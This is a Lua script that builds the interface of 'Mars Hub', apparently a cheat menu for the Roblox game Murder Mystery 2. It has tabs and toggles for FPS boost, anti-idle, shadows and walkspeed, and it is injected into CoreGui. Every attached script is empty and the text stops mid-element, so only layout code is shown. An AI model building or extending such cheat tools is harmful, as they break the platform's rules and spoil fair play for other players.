-- This file was deobfusctated/pasted by Lame (special thanks to project vault)

local G2L = {};

-- StarterGui.MurderMystery2
G2L["1"] = Instance.new("ScreenGui", game:GetService("CoreGui"));
G2L["1"]["IgnoreGuiInset"] = true;
G2L["1"]["ScreenInsets"] = Enum.ScreenInsets.DeviceSafeInsets;
G2L["1"]["Name"] = [[MurderMystery2]];
G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
G2L["1"]["ResetOnSpawn"] = false;

-- StarterGui.MurderMystery2.UIPlaceHolder
G2L["2"] = Instance.new("Frame", G2L["1"]);
G2L["2"]["BorderSizePixel"] = 0;
G2L["2"]["BackgroundColor3"] = Color3.fromRGB(58, 58, 58);
G2L["2"]["Size"] = UDim2.new(0, 518, 0, 267);
G2L["2"]["Position"] = UDim2.new(0.23851, 0, 0.13728, 0);
G2L["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2"]["Name"] = [[UIPlaceHolder]];

-- StarterGui.MurderMystery2.UIPlaceHolder.UICorner
G2L["3"] = Instance.new("UICorner", G2L["2"]);
G2L["3"]["CornerRadius"] = UDim.new(0, 11);

-- StarterGui.MurderMystery2.UIPlaceHolder.Top
G2L["4"] = Instance.new("Frame", G2L["2"]);
G2L["4"]["ZIndex"] = 0;
G2L["4"]["BorderSizePixel"] = 0;
G2L["4"]["BackgroundColor3"] = Color3.fromRGB(34, 34, 34);
G2L["4"]["Size"] = UDim2.new(0, 518, 0, 41);
G2L["4"]["Position"] = UDim2.new(0, 0, -0.10861, 0);
G2L["4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4"]["Name"] = [[Top]];

-- StarterGui.MurderMystery2.UIPlaceHolder.Top.UICorner
G2L["5"] = Instance.new("UICorner", G2L["4"]);
G2L["5"]["CornerRadius"] = UDim.new(0, 6);

-- StarterGui.MurderMystery2.UIPlaceHolder.Top.title
G2L["6"] = Instance.new("TextLabel", G2L["4"]);
G2L["6"]["BorderSizePixel"] = 0;
G2L["6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6"]["TextSize"] = 20;
G2L["6"]["FontFace"] = Font.new([[rbxasset://fonts/families/JosefinSans.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["6"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6"]["BackgroundTransparency"] = 1;
G2L["6"]["Size"] = UDim2.new(0, 200, 0, 23);
G2L["6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6"]["Text"] = [[Mars Hub]];
G2L["6"]["Name"] = [[title]];
G2L["6"]["Position"] = UDim2.new(0.307, 0, 0.22, 0);

-- StarterGui.MurderMystery2.UIPlaceHolder.Top.TextButton
G2L["7"] = Instance.new("TextButton", G2L["4"]);
G2L["7"]["BorderSizePixel"] = 0;
G2L["7"]["TextSize"] = 14;
G2L["7"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7"]["FontFace"] = Font.new([[rbxasset://fonts/families/JosefinSans.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["7"]["Size"] = UDim2.new(0, 39, 0, 31);
G2L["7"]["BackgroundTransparency"] = 1;
G2L["7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7"]["Text"] = [[X]];
G2L["7"]["Position"] = UDim2.new(0.92471, 0, 0.12195, 0);

-- StarterGui.MurderMystery2.UIPlaceHolder.border
G2L["8"] = Instance.new("TextLabel", G2L["2"]);
G2L["8"]["BorderSizePixel"] = 0;
G2L["8"]["BackgroundColor3"] = Color3.fromRGB(101, 102, 102);
G2L["8"]["TextSize"] = 14;
G2L["8"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["8"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8"]["Size"] = UDim2.new(0, 518, 0, 1);
G2L["8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8"]["Text"] = [[]];
G2L["8"]["Name"] = [[border]];
G2L["8"]["Position"] = UDim2.new(0, 0, 0.035, 0);

-- StarterGui.MurderMystery2.UIPlaceHolder.border
G2L["9"] = Instance.new("TextLabel", G2L["2"]);
G2L["9"]["BorderSizePixel"] = 0;
G2L["9"]["BackgroundColor3"] = Color3.fromRGB(101, 102, 102);
G2L["9"]["TextSize"] = 14;
G2L["9"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["9"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["9"]["Size"] = UDim2.new(0, -2, 0, 255);
G2L["9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["9"]["Text"] = [[]];
G2L["9"]["Name"] = [[border]];
G2L["9"]["Position"] = UDim2.new(0.24517, 0, 0.035, 0);

-- StarterGui.MurderMystery2.UIPlaceHolder.Side
G2L["a"] = Instance.new("Frame", G2L["2"]);
G2L["a"]["BorderSizePixel"] = 0;
G2L["a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a"]["Size"] = UDim2.new(0, 104, 0, 253);
G2L["a"]["Position"] = UDim2.new(0, 0, 0.04494, 0);
G2L["a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a"]["Name"] = [[Side]];
G2L["a"]["BackgroundTransparency"] = 1;

-- StarterGui.MurderMystery2.UIPlaceHolder.Side.Settings
G2L["b"] = Instance.new("TextButton", G2L["a"]);
G2L["b"]["BorderSizePixel"] = 0;
G2L["b"]["TextSize"] = 18;
G2L["b"]["TextColor3"] = Color3.fromRGB(207, 207, 207);
G2L["b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["b"]["Size"] = UDim2.new(0, 111, 0, 23);
G2L["b"]["BackgroundTransparency"] = 1;
G2L["b"]["Name"] = [[Settings]];
G2L["b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b"]["Text"] = [[Settings]];
G2L["b"]["Position"] = UDim2.new(0.12145, 0, 0.34783, 0);

-- StarterGui.MurderMystery2.UIPlaceHolder.Side.Settings.ImageLabel
G2L["c"] = Instance.new("ImageLabel", G2L["b"]);
G2L["c"]["BorderSizePixel"] = 0;
G2L["c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c"]["Image"] = [[rbxassetid://10734950020]];
G2L["c"]["Size"] = UDim2.new(0, 26, 0, 23);
G2L["c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c"]["BackgroundTransparency"] = 1;
G2L["c"]["Position"] = UDim2.new(-0.05405, 0, 0, 0);

-- StarterGui.MurderMystery2.UIPlaceHolder.Side.Settings.LocalScript
G2L["d"] = Instance.new("LocalScript", G2L["b"]);


-- StarterGui.MurderMystery2.UIPlaceHolder.Side.Visuals
G2L["e"] = Instance.new("TextButton", G2L["a"]);
G2L["e"]["BorderSizePixel"] = 0;
G2L["e"]["TextSize"] = 18;
G2L["e"]["TextColor3"] = Color3.fromRGB(207, 207, 207);
G2L["e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["e"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["e"]["Size"] = UDim2.new(0, 111, 0, 23);
G2L["e"]["BackgroundTransparency"] = 1;
G2L["e"]["Name"] = [[Visuals]];
G2L["e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e"]["Text"] = [[Misc]];
G2L["e"]["Position"] = UDim2.new(0.12145, 0, 0.05534, 0);

-- StarterGui.MurderMystery2.UIPlaceHolder.Side.Visuals.ImageLabel
G2L["f"] = Instance.new("ImageLabel", G2L["e"]);
G2L["f"]["BorderSizePixel"] = 0;
G2L["f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["f"]["Image"] = [[rbxassetid://10709818534]];
G2L["f"]["Size"] = UDim2.new(0, 26, 0, 23);
G2L["f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["f"]["BackgroundTransparency"] = 1;
G2L["f"]["Position"] = UDim2.new(-0.05405, 0, 0, 0);

-- StarterGui.MurderMystery2.UIPlaceHolder.Side.Visuals.LocalScript
G2L["10"] = Instance.new("LocalScript", G2L["e"]);


-- StarterGui.MurderMystery2.UIPlaceHolder.Side.Hub
G2L["11"] = Instance.new("TextButton", G2L["a"]);
G2L["11"]["BorderSizePixel"] = 0;
G2L["11"]["TextSize"] = 18;
G2L["11"]["TextColor3"] = Color3.fromRGB(207, 207, 207);
G2L["11"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["11"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["11"]["Size"] = UDim2.new(0, 111, 0, 23);
G2L["11"]["BackgroundTransparency"] = 1;
G2L["11"]["Name"] = [[Hub]];
G2L["11"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["11"]["Text"] = [[Hub]];
G2L["11"]["Position"] = UDim2.new(0.12145, 0, 0.20158, 0);

-- StarterGui.MurderMystery2.UIPlaceHolder.Side.Hub.ImageLabel
G2L["12"] = Instance.new("ImageLabel", G2L["11"]);
G2L["12"]["BorderSizePixel"] = 0;
G2L["12"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["12"]["Image"] = [[rbxassetid://10723395457]];
G2L["12"]["Size"] = UDim2.new(0, 26, 0, 23);
G2L["12"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["12"]["BackgroundTransparency"] = 1;
G2L["12"]["Position"] = UDim2.new(-0.05405, 0, 0, 0);

-- StarterGui.MurderMystery2.UIPlaceHolder.Side.Hub.LocalScript
G2L["13"] = Instance.new("LocalScript", G2L["11"]);


-- StarterGui.MurderMystery2.UIPlaceHolder.Side.border
G2L["14"] = Instance.new("TextLabel", G2L["a"]);
G2L["14"]["BorderSizePixel"] = 0;
G2L["14"]["BackgroundColor3"] = Color3.fromRGB(101, 102, 102);
G2L["14"]["TextSize"] = 14;
G2L["14"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["14"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["14"]["Size"] = UDim2.new(0, 125, 0, 1);
G2L["14"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["14"]["Text"] = [[]];
G2L["14"]["Name"] = [[border]];
G2L["14"]["Position"] = UDim2.new(0, 0, 0.79389, 0);

-- StarterGui.MurderMystery2.UIPlaceHolder.Side.plrembed
G2L["15"] = Instance.new("TextLabel", G2L["a"]);
G2L["15"]["TextWrapped"] = true;
G2L["15"]["BorderSizePixel"] = 0;
G2L["15"]["TextScaled"] = true;
G2L["15"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["15"]["TextSize"] = 14;
G2L["15"]["FontFace"] = Font.new([[rbxasset://fonts/families/JosefinSans.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["15"]["TextColor3"] = Color3.fromRGB(233, 233, 233);
G2L["15"]["BackgroundTransparency"] = 1;
G2L["15"]["Size"] = UDim2.new(0, 73, 0, 18);
G2L["15"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["15"]["Text"] = [[nil]];
G2L["15"]["Name"] = [[plrembed]];
G2L["15"]["Position"] = UDim2.new(0.47, 0, 0.863, 0);

-- StarterGui.MurderMystery2.UIPlaceHolder.Side.plrembed.LocalScript
G2L["16"] = Instance.new("LocalScript", G2L["15"]);


-- StarterGui.MurderMystery2.UIPlaceHolder.Side.plrembed.plrembed
G2L["17"] = Instance.new("TextLabel", G2L["15"]);
G2L["17"]["TextWrapped"] = true;
G2L["17"]["BorderSizePixel"] = 0;
G2L["17"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["17"]["TextSize"] = 10;
G2L["17"]["FontFace"] = Font.new([[rbxasset://fonts/families/JosefinSans.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["17"]["TextColor3"] = Color3.fromRGB(161, 163, 163);
G2L["17"]["BackgroundTransparency"] = 1;
G2L["17"]["Size"] = UDim2.new(0, 73, 0, 18);
G2L["17"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["17"]["Text"] = [[nil]];
G2L["17"]["Name"] = [[plrembed]];
G2L["17"]["Position"] = UDim2.new(-0.0005, 0, 0.86298, 0);

-- StarterGui.MurderMystery2.UIPlaceHolder.Side.plrembed.plrembed.LocalScript
G2L["18"] = Instance.new("LocalScript", G2L["17"]);


-- StarterGui.MurderMystery2.UIPlaceHolder.Side.plrimage
G2L["19"] = Instance.new("ImageLabel", G2L["a"]);
G2L["19"]["BorderSizePixel"] = 0;
G2L["19"]["BackgroundColor3"] = Color3.fromRGB(79, 79, 79);
G2L["19"]["Image"] = [[rbxasset://textures/ui/GuiImagePlaceholder.png]];
G2L["19"]["Size"] = UDim2.new(0, 42, 0, 43);
G2L["19"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["19"]["BackgroundTransparency"] = 0.6;
G2L["19"]["Name"] = [[plrimage]];
G2L["19"]["Position"] = UDim2.new(0.04, 0, 0.817, 0);

-- StarterGui.MurderMystery2.UIPlaceHolder.Side.plrimage.UICorner
G2L["1a"] = Instance.new("UICorner", G2L["19"]);
G2L["1a"]["CornerRadius"] = UDim.new(1, 0);

-- StarterGui.MurderMystery2.UIPlaceHolder.Side.plrimage.LocalScript
G2L["1b"] = Instance.new("LocalScript", G2L["19"]);


-- StarterGui.MurderMystery2.UIPlaceHolder.Side.Suggest
G2L["1c"] = Instance.new("TextButton", G2L["a"]);
G2L["1c"]["BorderSizePixel"] = 0;
G2L["1c"]["TextSize"] = 18;
G2L["1c"]["TextColor3"] = Color3.fromRGB(207, 207, 207);
G2L["1c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1c"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["1c"]["Size"] = UDim2.new(0, 111, 0, 23);
G2L["1c"]["BackgroundTransparency"] = 1;
G2L["1c"]["Name"] = [[Suggest]];
G2L["1c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1c"]["Text"] = [[Suggest]];
G2L["1c"]["Position"] = UDim2.new(0.12145, 0, 0.66403, 0);

-- StarterGui.MurderMystery2.UIPlaceHolder.Side.Suggest.ImageLabel
G2L["1d"] = Instance.new("ImageLabel", G2L["1c"]);
G2L["1d"]["BorderSizePixel"] = 0;
G2L["1d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1d"]["Image"] = [[rbxassetid://10734907168]];
G2L["1d"]["Size"] = UDim2.new(0, 26, 0, 23);
G2L["1d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1d"]["BackgroundTransparency"] = 1;
G2L["1d"]["Position"] = UDim2.new(-0.05405, 0, 0, 0);

-- StarterGui.MurderMystery2.UIPlaceHolder.Side.Suggest.LocalScript
G2L["1e"] = Instance.new("LocalScript", G2L["1c"]);


-- StarterGui.MurderMystery2.UIPlaceHolder.DropShadowHolder
G2L["1f"] = Instance.new("Frame", G2L["2"]);
G2L["1f"]["ZIndex"] = 0;
G2L["1f"]["BorderSizePixel"] = 0;
G2L["1f"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["1f"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["1f"]["Name"] = [[DropShadowHolder]];
G2L["1f"]["BackgroundTransparency"] = 1;

-- StarterGui.MurderMystery2.UIPlaceHolder.DropShadowHolder.DropShadow
G2L["20"] = Instance.new("ImageLabel", G2L["1f"]);
G2L["20"]["ZIndex"] = 0;
G2L["20"]["BorderSizePixel"] = 0;
G2L["20"]["SliceCenter"] = Rect.new(49, 49, 450, 450);
G2L["20"]["ScaleType"] = Enum.ScaleType.Slice;
G2L["20"]["ImageTransparency"] = 0.5;
G2L["20"]["ImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["20"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["20"]["Image"] = [[rbxassetid://6014261993]];
G2L["20"]["Size"] = UDim2.new(1, 47, 1, 47);
G2L["20"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["20"]["BackgroundTransparency"] = 1;
G2L["20"]["Name"] = [[DropShadow]];
G2L["20"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);

-- StarterGui.MurderMystery2.UIPlaceHolder.SettingsElement
G2L["21"] = Instance.new("Folder", G2L["2"]);
G2L["21"]["Name"] = [[SettingsElement]];

-- StarterGui.MurderMystery2.UIPlaceHolder.SettingsElement.Element
G2L["22"] = Instance.new("Frame", G2L["21"]);
G2L["22"]["Visible"] = false;
G2L["22"]["BorderSizePixel"] = 0;
G2L["22"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["22"]["Size"] = UDim2.new(0, 391, 0, 249);
G2L["22"]["Position"] = UDim2.new(0.24517, 0, 0.04494, 0);
G2L["22"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["22"]["Name"] = [[Element]];
G2L["22"]["BackgroundTransparency"] = 1;

-- StarterGui.MurderMystery2.UIPlaceHolder.SettingsElement.Element.boostfps
G2L["23"] = Instance.new("Frame", G2L["22"]);
G2L["23"]["BorderSizePixel"] = 0;
G2L["23"]["BackgroundColor3"] = Color3.fromRGB(63, 63, 63);
G2L["23"]["Size"] = UDim2.new(0, 374, 0, 35);
G2L["23"]["Position"] = UDim2.new(0.023, 0, 0.05, 0);
G2L["23"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["23"]["Name"] = [[boostfps]];
G2L["23"]["BackgroundTransparency"] = 0.3;

-- StarterGui.MurderMystery2.UIPlaceHolder.SettingsElement.Element.boostfps.UICorner
G2L["24"] = Instance.new("UICorner", G2L["23"]);
G2L["24"]["CornerRadius"] = UDim.new(0, 10);

-- StarterGui.MurderMystery2.UIPlaceHolder.SettingsElement.Element.boostfps.TextLabel
G2L["25"] = Instance.new("TextLabel", G2L["23"]);
G2L["25"]["BorderSizePixel"] = 0;
G2L["25"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["25"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["25"]["TextSize"] = 14;
G2L["25"]["FontFace"] = Font.new([[rbxasset://fonts/families/JosefinSans.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["25"]["TextColor3"] = Color3.fromRGB(204, 204, 204);
G2L["25"]["BackgroundTransparency"] = 1;
G2L["25"]["Size"] = UDim2.new(0, 116, 0, 35);
G2L["25"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["25"]["Text"] = [[Boost FPS]];
G2L["25"]["Position"] = UDim2.new(0.019, 0, 0, 0);

-- StarterGui.MurderMystery2.UIPlaceHolder.SettingsElement.Element.boostfps.TextButton
G2L["26"] = Instance.new("TextButton", G2L["23"]);
G2L["26"]["BorderSizePixel"] = 0;
G2L["26"]["AutoButtonColor"] = false;
G2L["26"]["TextSize"] = 14;
G2L["26"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["26"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["26"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["26"]["Size"] = UDim2.new(0, 22, 0, 23);
G2L["26"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["26"]["Text"] = [[]];
G2L["26"]["Position"] = UDim2.new(0.91711, 0, 0.17143, 0);

-- StarterGui.MurderMystery2.UIPlaceHolder.SettingsElement.Element.boostfps.TextButton.UICorner
G2L["27"] = Instance.new("UICorner", G2L["26"]);
G2L["27"]["CornerRadius"] = UDim.new(0, 5);

-- StarterGui.MurderMystery2.UIPlaceHolder.SettingsElement.Element.boostfps.TextButton.LocalScript
G2L["28"] = Instance.new("LocalScript", G2L["26"]);


-- StarterGui.MurderMystery2.UIPlaceHolder.SettingsElement.Element.boostfps.TextButton.ImageLabel
G2L["29"] = Instance.new("ImageLabel", G2L["26"]);
G2L["29"]["ZIndex"] = 0;
G2L["29"]["BorderSizePixel"] = 0;
G2L["29"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["29"]["Image"] = [[rbxassetid://10709790644]];
G2L["29"]["Size"] = UDim2.new(1, 1, 1, 1);
G2L["29"]["Visible"] = false;
G2L["29"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["29"]["BackgroundTransparency"] = 1;

-- StarterGui.MurderMystery2.UIPlaceHolder.SettingsElement.Element.antiidle
G2L["2a"] = Instance.new("Frame", G2L["22"]);
G2L["2a"]["BorderSizePixel"] = 0;
G2L["2a"]["BackgroundColor3"] = Color3.fromRGB(63, 63, 63);
G2L["2a"]["Size"] = UDim2.new(0, 374, 0, 35);
G2L["2a"]["Position"] = UDim2.new(0.023, 0, 0.24, 0);
G2L["2a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2a"]["Name"] = [[antiidle]];
G2L["2a"]["BackgroundTransparency"] = 0.3;

-- StarterGui.MurderMystery2.UIPlaceHolder.SettingsElement.Element.antiidle.UICorner
G2L["2b"] = Instance.new("UICorner", G2L["2a"]);
G2L["2b"]["CornerRadius"] = UDim.new(0, 10);

-- StarterGui.MurderMystery2.UIPlaceHolder.SettingsElement.Element.antiidle.TextLabel
G2L["2c"] = Instance.new("TextLabel", G2L["2a"]);
G2L["2c"]["BorderSizePixel"] = 0;
G2L["2c"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["2c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2c"]["TextSize"] = 14;
G2L["2c"]["FontFace"] = Font.new([[rbxasset://fonts/families/JosefinSans.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["2c"]["TextColor3"] = Color3.fromRGB(204, 204, 204);
G2L["2c"]["BackgroundTransparency"] = 1;
G2L["2c"]["Size"] = UDim2.new(0, 116, 0, 35);
G2L["2c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2c"]["Text"] = [[Anti-Idle]];
G2L["2c"]["Position"] = UDim2.new(0.019, 0, 0, 0);

-- StarterGui.MurderMystery2.UIPlaceHolder.SettingsElement.Element.antiidle.TextButton
G2L["2d"] = Instance.new("TextButton", G2L["2a"]);
G2L["2d"]["BorderSizePixel"] = 0;
G2L["2d"]["AutoButtonColor"] = false;
G2L["2d"]["TextSize"] = 14;
G2L["2d"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["2d"]["Size"] = UDim2.new(0, 22, 0, 23);
G2L["2d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2d"]["Text"] = [[]];
G2L["2d"]["Position"] = UDim2.new(0.91711, 0, 0.14858, 0);

-- StarterGui.MurderMystery2.UIPlaceHolder.SettingsElement.Element.antiidle.TextButton.UICorner
G2L["2e"] = Instance.new("UICorner", G2L["2d"]);
G2L["2e"]["CornerRadius"] = UDim.new(0, 5);

-- StarterGui.MurderMystery2.UIPlaceHolder.SettingsElement.Element.antiidle.TextButton.LocalScript
G2L["2f"] = Instance.new("LocalScript", G2L["2d"]);


-- StarterGui.MurderMystery2.UIPlaceHolder.SettingsElement.Element.antiidle.TextButton.ImageLabel
G2L["30"] = Instance.new("ImageLabel", G2L["2d"]);
G2L["30"]["ZIndex"] = 0;
G2L["30"]["BorderSizePixel"] = 0;
G2L["30"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["30"]["Image"] = [[rbxassetid://10709790644]];
G2L["30"]["Size"] = UDim2.new(1, 1, 1, 1);
G2L["30"]["Visible"] = false;
G2L["30"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["30"]["BackgroundTransparency"] = 1;

-- StarterGui.MurderMystery2.UIPlaceHolder.SettingsElement.Element.globalshadows
G2L["31"] = Instance.new("Frame", G2L["22"]);
G2L["31"]["BorderSizePixel"] = 0;
G2L["31"]["BackgroundColor3"] = Color3.fromRGB(63, 63, 63);
G2L["31"]["Size"] = UDim2.new(0, 374, 0, 35);
G2L["31"]["Position"] = UDim2.new(0.023, 0, 0.43, 0);
G2L["31"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["31"]["Name"] = [[globalshadows]];
G2L["31"]["BackgroundTransparency"] = 0.3;

-- StarterGui.MurderMystery2.UIPlaceHolder.SettingsElement.Element.globalshadows.UICorner
G2L["32"] = Instance.new("UICorner", G2L["31"]);
G2L["32"]["CornerRadius"] = UDim.new(0, 10);

-- StarterGui.MurderMystery2.UIPlaceHolder.SettingsElement.Element.globalshadows.TextLabel
G2L["33"] = Instance.new("TextLabel", G2L["31"]);
G2L["33"]["BorderSizePixel"] = 0;
G2L["33"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["33"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["33"]["TextSize"] = 14;
G2L["33"]["FontFace"] = Font.new([[rbxasset://fonts/families/JosefinSans.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["33"]["TextColor3"] = Color3.fromRGB(204, 204, 204);
G2L["33"]["BackgroundTransparency"] = 1;
G2L["33"]["Size"] = UDim2.new(0, 116, 0, 27);
G2L["33"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["33"]["Text"] = [[Global Shadows]];
G2L["33"]["Position"] = UDim2.new(0.019, 0, 0.2, 0);

-- StarterGui.MurderMystery2.UIPlaceHolder.SettingsElement.Element.globalshadows.TextButton
G2L["34"] = Instance.new("TextButton", G2L["31"]);
G2L["34"]["BorderSizePixel"] = 0;
G2L["34"]["AutoButtonColor"] = false;
G2L["34"]["TextSize"] = 14;
G2L["34"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["34"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["34"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["34"]["Size"] = UDim2.new(0, 22, 0, 23);
G2L["34"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["34"]["Text"] = [[]];
G2L["34"]["Position"] = UDim2.new(0.91711, 0, 0.14858, 0);

-- StarterGui.MurderMystery2.UIPlaceHolder.SettingsElement.Element.globalshadows.TextButton.UICorner
G2L["35"] = Instance.new("UICorner", G2L["34"]);
G2L["35"]["CornerRadius"] = UDim.new(0, 5);

-- StarterGui.MurderMystery2.UIPlaceHolder.SettingsElement.Element.globalshadows.TextButton.LocalScript
G2L["36"] = Instance.new("LocalScript", G2L["34"]);


-- StarterGui.MurderMystery2.UIPlaceHolder.SettingsElement.Element.globalshadows.TextButton.ImageLabel
G2L["37"] = Instance.new("ImageLabel", G2L["34"]);
G2L["37"]["ZIndex"] = 0;
G2L["37"]["BorderSizePixel"] = 0;
G2L["37"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["37"]["Image"] = [[rbxassetid://10709790644]];
G2L["37"]["Size"] = UDim2.new(1, 1, 1, 1);
G2L["37"]["Visible"] = false;
G2L["37"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["37"]["BackgroundTransparency"] = 1;

-- StarterGui.MurderMystery2.UIPlaceHolder.SettingsElement.Element.plrwalkspeed
G2L["38"] = Instance.new("Frame", G2L["22"]);
G2L["38"]["BorderSizePixel"] = 0;
G2L["38"]["BackgroundColor3"] = Color3.fromRGB(63, 63, 63);
G2L["38"]["Size"] = UDim2.new(0, 374, 0, 35);
G2L["38"]["Position"] = UDim2.new(0.023, 0, 0.633, 0);
G2L["38"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["38"]["Name"] = [[plrwalkspeed]];
G2L["38"]["BackgroundTransparency"] = 0.3;

-- StarterGui.MurderMystery2.UIPlaceHolder.SettingsElement.Element.plrwalkspeed.UICorner
G2L["39"] = Instance.new("UICorner", G2L["38"]);
G2L["39"]["CornerRadius"] = UDim.new(0, 10);

-- StarterGui.MurderMystery2.UIPlaceHolder.SettingsElement.Element.plrwalkspeed.TextLabel
G2L["3a"] = Instance.new("TextLabel", G2L["38"]);
G2L["3a"]["BorderSizePixel"] = 0;
G2L["3a"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["3a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3a"]["TextSize"] = 14;
G2L["3a"]["FontFace"] = Font.new([[rbxasset://fonts/families/JosefinSans.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["3a"]["TextColor3"] = Color3.fromRGB(204, 204, 204);
G2L["3a"]["BackgroundTransparency"] = 1;
G2L["3a"]["Size"] = UDim2.new(0, 116, 0, 27);
G2L["3a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3a"]["Text"] = [[Walkspeed]];
